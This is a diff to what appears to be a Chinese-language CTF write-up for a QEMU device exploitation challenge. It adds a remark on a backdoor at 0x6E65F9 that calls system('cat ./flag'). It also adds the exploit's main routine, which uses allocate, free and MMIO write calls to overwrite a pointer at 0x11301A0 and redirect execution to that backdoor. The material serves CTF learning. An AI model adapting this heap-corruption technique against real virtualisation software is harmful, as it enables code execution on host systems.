@@ -165,7 +165,7 @@ case为1时为del,val没什么用
 
 case为2时为write,val是要写入的值,可以和上面的mmio_read对应addr参数的功能
 
-
+6E65F9还有个后门system("cat ./flag")
 
 EXP:
 
@@ -221,6 +221,15 @@ int main()
 	base = (uint64_t)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	assert(base != -1);
     
+    new(15,0x70);
+    del(0);
+    w(0,0,0x11301A0);
+    new(2,0x70);
+    new(2,0x70);
+    w(2,0,0x6E65F9);
+    w(2,1,0);
+    
+    return 0;
 }
 ```
 
